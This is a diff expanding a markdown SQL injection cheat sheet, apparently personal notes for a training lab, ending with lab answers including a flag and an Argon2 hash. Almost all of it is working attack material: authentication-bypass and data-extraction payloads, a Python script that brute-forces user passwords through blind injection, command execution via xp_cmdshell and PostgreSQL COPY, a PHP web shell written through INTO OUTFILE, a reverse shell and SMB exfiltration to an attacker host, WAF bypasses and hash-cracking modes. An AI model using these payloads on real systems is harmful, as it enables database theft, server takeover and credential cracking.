@@ -5,11 +5,32 @@
 ## Discovery
 
 ```bash
-# Test for injection (any input field)
-'       → SQL error or behavior change = injectable
-"       → alternate quote test
-' OR '1'='1    → auth bypass (string context)
-' OR 1=1-- -   → auth bypass with comment
+# Inject these into any input field, query string, header, or cookie
+'           → SQL error or behavior change = injectable
+"           → alternate quote (string context)
+\           → escape — error if naïve concatenation
+;           → stacked queries (MSSQL/PostgreSQL allow these)
+--          → MySQL/MSSQL comment (need trailing space or '-' in MySQL)
+#           → MySQL comment alternative
+)           → if input is inside parentheses
+' OR '1'='1   → auth bypass (string context)
+' OR 1=1-- -  → auth bypass with comment
+1' AND SLEEP(5)-- -   → time-based confirmation
+```
+
+> **Always test for SQL errors first.** Verbose errors leak query structure (column names, line of failure). Use `--parse-errors` in sqlmap or just submit `'` and read the response.
+
+---
+
+## Injection Types Decision Tree
+
+```
+Response shows SQL error?        → ERROR-BASED — extract via EXTRACTVALUE/UPDATEXML
+Response shows query results?    → UNION — extract directly
+Page changes (true/false)?       → BOOLEAN BLIND — 1 char/request via SUBSTRING+IF
+Same page but delay-able?        → TIME-BASED BLIND — SLEEP/WAITFOR
+Response unchanged + can stack?  → STACKED (MSSQL/PostgreSQL `;`)
+None of above?                   → OUT-OF-BAND — DNS/HTTP exfil (xp_dirtree, LOAD XML)
 ```
 
 ---
@@ -20,24 +41,30 @@
 # Known username
 admin'-- -              # comment out password check
 admin' OR '1'='1        # OR true condition
+admin' OR 1=1#          # # comment (MySQL)
 
-# Unknown username  
+# Unknown username
 ' OR '1'='1             # username field
 ' OR '1'='1             # password field (both)
 
 # Parentheses in query: SELECT * FROM logins WHERE (username='INPUT')
 admin')-- -             # close paren, comment rest
 ' OR id=5)-- -          # target specific user by ID
+
+# Double-quoted columns
+admin"-- -
+admin" OR "1"="1
 ```
 
 ---
 
-## UNION Injection (direct output)
+## UNION Injection (direct output — fastest)
 
 ```bash
 # Step 1: Find column count
-' ORDER BY 1-- -   # increment until error
-' UNION SELECT NULL-- -   # increment NULLs until no error
+' ORDER BY 1-- -        # increment until error
+' UNION SELECT NULL-- -            # increment NULLs until no error
+' UNION SELECT NULL,NULL,NULL-- -  # match column count
 
 # Step 2: Find visible columns
 ' UNION SELECT 1,2,3,4-- -   # numbers appear in output = visible positions
@@ -46,11 +73,98 @@ admin')-- -             # close paren, comment rest
 ' UNION SELECT 1,@@version,3,4-- -
 ' UNION SELECT 1,user(),3,4-- -
 ' UNION SELECT 1,database(),3,4-- -
+
+# Concatenate multiple values in one column:
+' UNION SELECT 1,CONCAT(user(),0x7c,database(),0x7c,@@version),3,4-- -
+# 0x7c = '|' separator (avoid quotes that might be filtered)
+```
+
+> **Type mismatch?** If columns are typed (int vs string), only matching-type columns return data. `UNION SELECT 1,'text',3` — try string AND int in each position.
+
+---
+
+## Error-Based Extraction (MySQL)
+
+When no UNION possible but errors are displayed.
+
+```sql
+-- EXTRACTVALUE (MySQL 5.1+) — fastest, no LIMIT needed
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))-- -
+
+-- UPDATEXML (MySQL 5.1+)
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)-- -
+
+-- FLOOR/RAND (older MySQL)
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
+```
+
+> Error message displays the data after `~` (0x7e). Max ~32 chars per query — use `SUBSTRING` for longer values.
+
+---
+
+## Boolean Blind SQLi
+
+When the page only shows TRUE/FALSE (different content, different status code).
+
+```sql
+-- Test injection
+' AND 1=1-- -           → page renders normally (TRUE)
+' AND 1=2-- -           → page differs (FALSE)
+
+-- Extract length
+' AND LENGTH((SELECT user()))=14-- -    -- brute the length until TRUE
+
+-- Extract char-by-char
+' AND SUBSTRING((SELECT user()),1,1)='r'-- -      -- first char of user()
+' AND ASCII(SUBSTRING((SELECT user()),1,1))>100-- -    -- binary search
+
+-- ASCII binary search saves requests (8 vs 95)
+' AND ASCII(SUBSTRING((SELECT user()),POS,1)) > MID-- -
+```
+
+**Python helper for boolean blind:**
+```python
+import requests, string
+chars = string.ascii_lowercase + string.digits + '_-@. '
+def check(payload):
+    r = requests.get(URL, params={'q': payload}, allow_redirects=False)
+    return 'WELCOME' in r.text   # whatever distinguishes TRUE
+result = ''
+for pos in range(1, 50):
+    for c in chars:
+        p = f"' AND SUBSTRING((SELECT password FROM users WHERE id=1),{pos},1)='{c}'-- -"
+        if check(p):
+            result += c; print(result); break
+    else: break
 ```
 
 ---
 
-## Database Enumeration
+## Time-Based Blind SQLi
+
+When TRUE/FALSE returns identical responses. Use delay as the signal.
+
+```sql
+-- MySQL
+' AND IF(SUBSTRING(user(),1,1)='r',SLEEP(5),0)-- -
+' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)-- -
+
+-- MSSQL
+'; IF (LEN(user_name()) > 5) WAITFOR DELAY '0:0:5'-- -
+
+-- PostgreSQL
+'; SELECT CASE WHEN (SUBSTRING(version(),1,1)='P') THEN pg_sleep(5) ELSE pg_sleep(0) END-- -
+
+-- Oracle (no SLEEP — use HEAVY query)
+' AND 1=(CASE WHEN (...) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END)-- -
+```
+
+> Time-based is **slowest** — 1 char = 1 request, each request waits 5s. Use only when nothing else works. Increase `--threads` in sqlmap to parallelize.
+
+---
+
+## Database Enumeration (MySQL)
 
 ```sql
 -- List databases
@@ -64,24 +178,83 @@ UNION SELECT 1,COLUMN_NAME,TABLE_NAME,4 FROM information_schema.COLUMNS WHERE ta
 
 -- Dump data (dot notation for cross-DB access)
 UNION SELECT 1,username,password,4 FROM dbname.tablename-- -
+
+-- All tables + columns in one query
+UNION SELECT 1,GROUP_CONCAT(TABLE_SCHEMA,0x2e,TABLE_NAME,0x3a,COLUMN_NAME SEPARATOR 0x0a),3,4 FROM information_schema.columns-- -
 ```
 
 ---
 
-## File Operations (requires FILE privilege)
+## DBMS-Specific Cheatsheet
 
-```bash
-# Check privilege
+| Function | MySQL | MSSQL | PostgreSQL | Oracle |
+|----------|-------|-------|------------|--------|
+| Version | `@@version` / `version()` | `@@version` | `version()` | `(SELECT banner FROM v$version)` |
+| Current user | `user()` / `current_user()` | `SYSTEM_USER` / `user_name()` | `current_user` / `user` | `(SELECT user FROM dual)` |
+| Current DB | `database()` | `DB_NAME()` | `current_database()` | `(SELECT global_name FROM global_name)` |
+| Concat | `CONCAT(a,b)` | `a+b` | `a\|\|b` | `a\|\|b` |
+| Substring | `SUBSTRING(s,1,1)` | `SUBSTRING(s,1,1)` | `SUBSTRING(s,1,1)` | `SUBSTR(s,1,1)` |
+| Comments | `-- ` / `#` / `/* */` | `--` / `/* */` | `--` / `/* */` | `--` / `/* */` |
+| String quote | `'` or `"` | `'` only | `'` only | `'` only |
+| Sleep | `SLEEP(5)` | `WAITFOR DELAY '0:0:5'` | `pg_sleep(5)` | `dbms_lock.sleep(5)` |
+| List DBs | `information_schema.schemata` | `master.dbo.sysdatabases` | `pg_database` | `(SELECT DISTINCT owner FROM all_tables)` |
+| List tables | `information_schema.tables` | `sysobjects WHERE xtype='U'` | `pg_tables` | `all_tables` |
+| List columns | `information_schema.columns` | `syscolumns` | `information_schema.columns` | `all_tab_columns` |
+| Read file | `LOAD_FILE('/etc/passwd')` | `BULK INSERT` | `pg_read_file()` | `UTL_FILE` |
+| Write file | `INTO OUTFILE` | `sp_OACreate` / `xp_cmdshell echo > f` | `COPY ... TO` | `UTL_FILE.FOPEN` |
+| Cmd exec | `INTO OUTFILE` (web shell) | `xp_cmdshell` | `COPY FROM PROGRAM` | `EXTPROC` libs |
+| Stacked | ❌ (PHP/mysqli default) | ✅ | ✅ | ❌ |
+
+---
+
+## MSSQL — Stacked Queries + xp_cmdshell
+
+When the injection point is in MSSQL and stacking is allowed:
+
+```sql
+'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;-- -
+'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -
+'; EXEC xp_cmdshell 'whoami'-- -
+
+-- Out-of-band exfil via SMB (NTLM hash to Responder):
+'; EXEC master..xp_dirtree '\\ATTACKER_IP\share'-- -
+
+-- Linked server enumeration:
+'; SELECT srvname FROM master..sysservers-- -
+```
+
+---
+
+## PostgreSQL — RCE via COPY
+
+```sql
+-- COPY FROM PROGRAM (PostgreSQL 9.3+, requires superuser)
+'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id';-- -
+'; SELECT * FROM cmd_exec;-- -
+
+-- Read file:
+'; CREATE TABLE r(t text); COPY r FROM '/etc/passwd';-- -
+```
+
+---
+
+## File Operations (MySQL — requires FILE privilege)
+
+```sql
+-- Check FILE privilege
 UNION SELECT 1,super_priv,3,4 FROM mysql.user WHERE user='root'-- -
 UNION SELECT 1,variable_name,variable_value,4 FROM information_schema.global_variables WHERE variable_name='secure_file_priv'-- -
+-- secure_file_priv='' → can write anywhere; '/some/dir/' → restricted; NULL → disabled
 
-# Read file
+-- Read file
 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4-- -
 UNION SELECT 1,LOAD_FILE('/etc/nginx/sites-enabled/default'),3,4-- -   # → find webroot
 UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3,4-- -            # → DB creds
+UNION SELECT 1,HEX(LOAD_FILE('/binary/file')),3,4-- -                   # binary as hex
 
-# Write file (test /tmp first, then webroot)
+-- Write file (test /tmp first, then webroot)
 UNION SELECT "","<?php system($_REQUEST[0]); ?>","","" INTO OUTFILE '/var/www/html/shell.php'-- -
+UNION SELECT NULL,'<?php system($_REQUEST[0]); ?>',NULL,NULL INTO OUTFILE '/var/www/html/shell.php'-- -
 ```
 
 ---
@@ -89,11 +262,63 @@ UNION SELECT "","<?php system($_REQUEST[0]); ?>","","" INTO OUTFILE '/var/www/ht
 ## Web Shell Usage
 
 ```bash
-# Execute commands
 curl "http://TARGET/shell.php?0=id"
 curl "http://TARGET/shell.php?0=find+/+-maxdepth+4+-name+flag*+2>/dev/null"
 curl "http://TARGET/shell.php?0=cat+/flag.txt"
+
+# Upgrade to reverse shell:
+curl "http://TARGET/shell.php?0=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261'"
 ```
+
+---
+
+## WAF Bypass Tricks
+
+```sql
+-- Case variation (basic WAFs only)
+SeLeCt → SELECT
+UnIoN sElEcT → UNION SELECT
+
+-- Comment insertion (MySQL inline /**/)
+UNI/**/ON SE/**/LECT 1,2,3
+UNION/*!50000SELECT*/ 1,2,3        -- MySQL versioned comment
+
+-- Whitespace alternatives
+%09 %0a %0b %0c %0d %a0   -- tab, LF, VT, FF, CR, non-breaking space
+%23 (URL-encoded #)
++ (URL-encoded space)
+
+-- Concatenation bypasses keyword filter
+'UN'+'ION SE'+'LECT'                 -- MSSQL string concat
+CONCAT('SE','LECT')                  -- MySQL
+
+-- Encoding
+0x53454c454354 → SELECT (hex)
+CHAR(83,69,76,69,67,84) → SELECT     -- MySQL/MSSQL
+CHR(83)||CHR(69)||... → SELECT       -- Oracle/PostgreSQL
+
+-- Quote bypass (when ' filtered)
+0x61646d696e → 'admin' (hex literal works without quotes)
+CHAR(97,100,109,105,110) → 'admin'
+
+-- HTTP Parameter Pollution
+?id=1&id=2 UNION SELECT 1,2,3-- -    -- ASP/ASP.NET concatenates
+```
+
+---
+
+## Second-Order SQLi
+
+User input is **stored** and later used in a different query without sanitization. Example: register with username `admin' --` → the registration sanitizes the insert but a later "change password" reuses the stored username unescaped.
+
+```bash
+1. Register: username = "admin'-- -"
+2. Login: as admin'-- -
+3. Change password endpoint runs: UPDATE users SET password='...' WHERE username='admin'-- -'
+   → admin's password is changed, not yours
+```
+
+> sqlmap supports this via `--second-url=...` to trigger the second request.
 
 ---
 
@@ -107,7 +332,26 @@ USE dbname;
 SHOW TABLES;
 DESCRIBE tablename;
 SELECT * FROM table WHERE col LIKE 'val%';
+SELECT user, host, authentication_string FROM mysql.user;   -- creds for cracking
 ```
+
+---
+
+## Hashcat Modes (database hashes)
+
+| Hash format | -m |
+|-------------|----|
+| MySQL 4.1+ (`*A1B2...`) | 300 |
+| MySQL 3.x (`67BACE...`) | 200 |
+| MSSQL 2000 | 131 |
+| MSSQL 2005 | 132 |
+| MSSQL 2012/14 | 1731 |
+| PostgreSQL `md5...` | 12 |
+| Oracle 7-10g (DES) | 3100 |
+| Oracle 11g (SHA-1) | 112 |
+| Oracle 12c+ (SHA-512) | 12300 |
+| Argon2i (modern app DB) | uncrackable — focus on hash retrieval |
+| bcrypt `$2a$/$2b$` | 3200 |
 
 ---
 
@@ -129,3 +373,41 @@ SELECT * FROM table WHERE col LIKE 'val%';
 | 17 Q1 | Admin password hash | `$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU` |
 | 17 Q2 | Webroot | `/var/www/chattr-prod` |
 | 17 Q3 | Flag via RCE | `061b1aeb94dec6bf5d9c27032b3c1d8d` |
+
+---
+
+## Decision Tree When Stuck
+
+```
+SQL error visible?
+  → Error-based extraction (EXTRACTVALUE/UPDATEXML — fastest blind alternative)
+
+No error but page differs based on input?
+  → Boolean blind (SUBSTRING + ASCII binary search)
+
+No visible difference at all?
+  → Time-based (SLEEP/WAITFOR) — slowest, last resort
+
+Filtered keywords (UNION blocked)?
+  → Try case mixing: UnIoN
+  → Inline comments: UN/**/ION
+  → MySQL versioned: /*!50000UNION*/
+  → Encoding: hex / CHAR() / CONCAT()
+
+Quotes filtered?
+  → Hex literals: 0x61646d696e instead of 'admin'
+  → CHAR(97,100,...) function
+
+Filter strips spaces?
+  → Use comments instead: SELECT/**/foo/**/FROM/**/bar
+  → Tabs (%09), newlines (%0a)
+  → Parentheses: (SELECT(foo)FROM(bar))
+
+Single quote breaks query but I can't escape?
+  → Backslash before quote: \'
+  → Numeric context — no quotes needed: ?id=1 UNION SELECT...
+
+WAF blocks all common SQL keywords?
+  → Try second-order injection (stored value)
+  → Try OOB exfiltration (DNS / HTTP callback)
+```
